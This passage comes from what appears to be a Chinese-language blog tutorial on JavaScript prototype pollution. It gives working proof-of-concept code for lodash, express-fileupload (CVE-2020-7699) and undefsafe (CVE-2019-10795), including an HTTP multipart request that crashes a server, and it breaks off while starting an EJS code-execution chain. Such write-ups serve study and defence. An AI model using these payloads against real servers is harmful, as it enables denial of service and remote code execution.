</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>a</span> <span style=color:#f92672>=</span> <span style=color:#111>{};</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Before whoami: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#75af00>a</span><span style=color:#111>.</span><span style=color:#75af00>whoami</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75af00>lodash</span><span style=color:#111>.</span><span style=color:#75af00>mergeWith</span><span style=color:#111>({},</span> <span style=color:#75af00>JSON</span><span style=color:#111>.</span><span style=color:#75af00>parse</span><span style=color:#111>(</span><span style=color:#75af00>payload</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#34;After whoami: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#75af00>a</span><span style=color:#111>.</span><span style=color:#75af00>whoami</span><span style=color:#111>);</span>
</span></span></code></pre></div><h3 id=由传入参数定义对象属性-1>由传入参数定义对象属性</h3><h4 id=lodashset>lodash.set</h4><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75af00>set</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>,</span> <span style=color:#75af00>path</span><span style=color:#111>,</span> <span style=color:#75af00>value</span><span style=color:#111>);</span>
</span></span></code></pre></div><p>设置值到对象对应的属性路径上</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>lodash</span><span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;lodash&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>object_1</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span> <span style=color:#d88200>&#39;a&#39;</span><span style=color:#f92672>:</span> <span style=color:#111>[{</span> <span style=color:#d88200>&#39;b&#39;</span><span style=color:#f92672>:</span> <span style=color:#111>{</span> <span style=color:#d88200>&#39;c&#39;</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3</span> <span style=color:#111>}</span> <span style=color:#111>}]</span> <span style=color:#111>};</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>object_2</span> <span style=color:#f92672>=</span> <span style=color:#111>{}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>object_1</span><span style=color:#111>.</span><span style=color:#75af00>whoami</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// undefined
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>lodash</span><span style=color:#111>.</span><span style=color:#75af00>set</span><span style=color:#111>(</span><span style=color:#75af00>object_2</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;__proto__.[&#34;whoami&#34;]&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;Vulnerable&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>object_1</span><span style=color:#111>.</span><span style=color:#75af00>whoami</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Vulnerable
</span></span></span></code></pre></div><h4 id=lodashsetwith>lodash.setWith</h4><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75af00>setWith</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>,</span> <span style=color:#75af00>path</span><span style=color:#111>,</span> <span style=color:#75af00>value</span><span style=color:#111>,</span> <span style=color:#111>[</span><span style=color:#75af00>customizer</span><span style=color:#111>])</span>
</span></span></code></pre></div><p>POC</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>lodash</span><span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;lodash&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>object_1</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span> <span style=color:#d88200>&#39;a&#39;</span><span style=color:#f92672>:</span> <span style=color:#111>[{</span> <span style=color:#d88200>&#39;b&#39;</span><span style=color:#f92672>:</span> <span style=color:#111>{</span> <span style=color:#d88200>&#39;c&#39;</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3</span> <span style=color:#111>}</span> <span style=color:#111>}]</span> <span style=color:#111>};</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>object_2</span> <span style=color:#f92672>=</span> <span style=color:#111>{}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>object_1</span><span style=color:#111>.</span><span style=color:#75af00>whoami</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// undefined
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>lodash</span><span style=color:#111>.</span><span style=color:#75af00>setWith</span><span style=color:#111>(</span><span style=color:#75af00>object_2</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;__proto__.[&#34;whoami&#34;]&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;Vulnerable&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>object_1</span><span style=color:#111>.</span><span style=color:#75af00>whoami</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Vulnerable
</span></span></span></code></pre></div><h4 id=lodashdefaultsdeepcve-2019-10744>lodash.defaultsDeep/CVE-2019-10744</h4><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>mergeFn</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;lodash&#39;</span><span style=color:#111>).</span><span style=color:#75af00>defaultsDeep</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;{&#34;constructor&#34;: {&#34;prototype&#34;: {&#34;a0&#34;: true}}}&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>check</span><span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>mergeFn</span><span style=color:#111>({},</span> <span style=color:#75af00>JSON</span><span style=color:#111>.</span><span style=color:#75af00>parse</span><span style=color:#111>(</span><span style=color:#75af00>payload</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(({})[</span><span style=color:#d88200>`a0`</span><span style=color:#111>]</span> <span style=color:#f92672>===</span> <span style=color:#00a8c8>true</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>`Vulnerable to Prototype Pollution via </span><span style=color:#d88200>${</span><span style=color:#75af00>payload</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>  <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>check</span><span style=color:#111>();</span>
</span></span></code></pre></div><h3 id=污染tostringvalueof方法造成500>污染<code>toString</code>&<code>valueOf</code>方法造成500</h3><h4 id=express-fileupload---cve-2020-7699>express-fileupload - CVE-2020-7699</h4><ul><li>版本要求：express-fileupload &lt; 1.1.8; <code>parseNested = true</code></li></ul><p>express-fileupload模块可为express应用提供文件上传功能，该漏洞可引发DOS，配合EJS等模板引擎可以达到rce</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>npm i express-fileupload@1.1.7-alpha.4
</span></span></code></pre></div><p>定位到关键代码</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216160955128.png alt=image-20211216160955128></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216161010706.png alt=image-20211216161010706></p><p>当<code>parseNested</code>为ture，就会实现<code>processNested</code>方法，与上文提到的<code>merge</code>方法很类似，但是他会对传入的字典进行一个离谱的分析，当我们传入</p><pre tabindex=0><code>{&#34;a.b.c&#34;: &#34;whoami&#34;}
</code></pre><p>返回的是</p><pre tabindex=0><code>{ a: { b: { c: &#39;whoami&#39; } } }
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216162149919.png alt=image-20211216162149919></p><p>那我们要是传入</p><pre tabindex=0><code>{&#34;__proto__.toString&#34;:&#34;whoami&#34;}
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216162722845.png alt=image-20211216162722845></p><p>可以看到我们雀食把Object对象的<code>toString</code>方法给污染为了whoami</p><p>一个完整的栗子</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>express</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>fileupload</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express-fileupload&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>app</span> <span style=color:#f92672>=</span> <span style=color:#75af00>express</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>fileupload</span><span style=color:#111>({</span><span style=color:#75af00>parseNested</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>true</span><span style=color:#111>}))</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)=&gt;{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express-fileupload poc&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>server</span> <span style=color:#f92672>=</span> <span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>listen</span><span style=color:#111>(</span><span style=color:#ae81ff>3000</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span> <span style=color:#111>(){</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>host</span> <span style=color:#f92672>=</span> <span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>address</span><span style=color:#111>().</span><span style=color:#75af00>address</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>port</span> <span style=color:#f92672>=</span> <span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>address</span><span style=color:#111>().</span><span style=color:#75af00>port</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#39;url: http://%s:%s/&#39;</span><span style=color:#111>,</span> <span style=color:#75af00>host</span><span style=color:#111>,</span> <span style=color:#75af00>port</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span></code></pre></div><p>poc</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#75af00>POST</span> <span style=color:#111>/</span> <span style=color:#00a8c8>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span><span style=color:#111>Host</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>192.168.18.1:3000</span>
</span></span><span style=display:flex><span><span style=color:#111>Content-Type</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>multipart/form-data; boundary=--------1566035451</span>
</span></span><span style=display:flex><span><span style=color:#111>Content-Length</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>134</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>----------1566035451
</span></span><span style=display:flex><span>Content-Disposition: form-data; name=&#34;__proto__.toString&#34;; filename=&#34;filename&#34;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>whoami
</span></span><span style=display:flex><span>----------1566035451--
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216163633664.png alt=image-20211216163633664></p><p>之后再次刷新我们的http页面</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216163655473.png alt=image-20211216163655473></p><p>已经成功崩坏了</p><h4 id=undefsafe---cve-2019-10795>undefsafe - CVE-2019-10795</h4><ul><li>版本要求：Undefsafe &lt; 2.0.3</li></ul><p>这个模块的核心是一个用来处理访问对象属性不存在时的报错相关逻辑的函数</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>npm i undefsafe@2.0.2
</span></span></code></pre></div><p>先简单测试模块使用，首先是用undefined解决烦人的长调用栈报错</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>undefsafe</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;undefsafe&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>object</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>a</span><span style=color:#f92672>:</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>b</span><span style=color:#f92672>:</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>c</span><span style=color:#f92672>:</span><span style=color:#ae81ff>1</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>d</span><span style=color:#f92672>:</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>,</span><span style=color:#ae81ff>2</span><span style=color:#111>,</span><span style=color:#ae81ff>3</span><span style=color:#111>],</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>e</span><span style=color:#f92672>:</span><span style=color:#d88200>&#39;amiz&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>.</span><span style=color:#75af00>a</span><span style=color:#111>.</span><span style=color:#75af00>b</span><span style=color:#111>.</span><span style=color:#75af00>e</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// amiz
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>a</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;a.b.e&#39;</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// amiz
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>.</span><span style=color:#75af00>a</span><span style=color:#111>.</span><span style=color:#75af00>c</span><span style=color:#111>.</span><span style=color:#75af00>e</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// TypeError: Cannot read property &#39;e&#39; of undefined
</span></span></span><span style=display:flex><span><span style=color:#75715e>// .....
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>undefsafe</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;a.c.e&#39;</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// undefined
</span></span></span></code></pre></div><p>然后是简易赋值</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//{ a: { b: { c: 1, d: [Array], e: &#39;amiz&#39; } } }
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>undefsafe</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;a.b.e&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;123&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// { a: { b: { c: 1, d: [Array], e: &#39;123&#39; } } }
</span></span></span></code></pre></div><p>但如果我们访问的属性不存在</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//{ a: { b: { c: 1, d: [Array], e: &#39;amiz&#39; } } }
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>undefsafe</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;a.f.e&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;123&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// { a: { b: { c: 1, d: [Array], e: &#39;amiz&#39; }, e: &#39;123&#39; } }
</span></span></span></code></pre></div><p>它会直接给你摞起来，看起来肥肠的奇怪</p><p>demo1.js</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>undefsafe</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;undefsafe&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>object</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>a</span><span style=color:#f92672>:</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>b</span><span style=color:#f92672>:</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>c</span><span style=color:#f92672>:</span><span style=color:#ae81ff>1</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>d</span><span style=color:#f92672>:</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>,</span><span style=color:#ae81ff>2</span><span style=color:#111>,</span><span style=color:#ae81ff>3</span><span style=color:#111>],</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>e</span><span style=color:#f92672>:</span><span style=color:#d88200>&#39;amiz&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;__proto__.toString&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75af00>undefsafe</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>,</span> <span style=color:#75af00>payload</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;whoami&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>object</span><span style=color:#111>.</span><span style=color:#75af00>toString</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// whoami
</span></span></span></code></pre></div><p>当传入的后两个参数可控时可以污染<code>object</code>对象</p><p>demo2.js</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75af00>test</span> <span style=color:#f92672>=</span> <span style=color:#111>{}</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#39;this is &#39;</span> <span style=color:#f92672>+</span> <span style=color:#75af00>test</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// this is [object Object]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>undefsafe</span><span style=color:#111>(</span><span style=color:#75af00>test</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;__proto__.toString&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span> <span style=color:#111>(){</span><span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;evil code&#39;</span><span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#39;this is &#39;</span> <span style=color:#f92672>+</span> <span style=color:#75af00>test</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// this is evil code
</span></span></span></code></pre></div><p>将对象和字符串拼接时自动调用<code>toString</code>，但是test对象中没有，于是到<code>test.__proto__</code>中寻找，找到了<code>toString</code>并调用，而此时<code>toString</code>已经被污染</p><h3 id=结合模板引擎rce的实例>结合模板引擎RCE的实例</h3><h4 id=express-fileupload---cve-2020-7699-1>express-fileupload - CVE-2020-7699</h4><ul><li>版本要求：express-fileupload &lt; 1.1.8; <code>parseNested = true</code></li></ul><p>同样是这个版本的express-fileupload，还可以结合ejs模板实现RCE</p><p>server.js</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>express</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>fileupload</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express-fileupload&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>app</span> <span style=color:#f92672>=</span> <span style=color:#75af00>express</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>fileupload</span><span style=color:#111>({</span><span style=color:#75af00>parseNested</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>true</span><span style=color:#111>}))</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)=&gt;{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#111>Object</span><span style=color:#111>.</span><span style=color:#75af00>prototype</span><span style=color:#111>.</span><span style=color:#75af00>polluted</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;index.ejs&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>server</span> <span style=color:#f92672>=</span> <span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>listen</span><span style=color:#111>(</span><span style=color:#ae81ff>3000</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span> <span style=color:#111>(){</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>host</span> <span style=color:#f92672>=</span> <span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>address</span><span style=color:#111>().</span><span style=color:#75af00>address</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>port</span> <span style=color:#f92672>=</span> <span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>address</span><span style=color:#111>().</span><span style=color:#75af00>port</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#39;url: http://%s:%s/&#39;</span><span style=color:#111>,</span> <span style=color:#75af00>host</span><span style=color:#111>,</span> <span style=color:#75af00>port</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span></code></pre></div><p>index.ejs</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span><span style=color:#111>&lt;</span><span style=color:#f92672>html</span><span style=color:#111>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#111>&lt;</span><span style=color:#f92672>head</span><span style=color:#111>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>&lt;</span><span style=color:#f92672>meta</span> <span style=color:#75af00>charset</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;utf-8&#34;</span><span style=color:#111>&gt;</span>
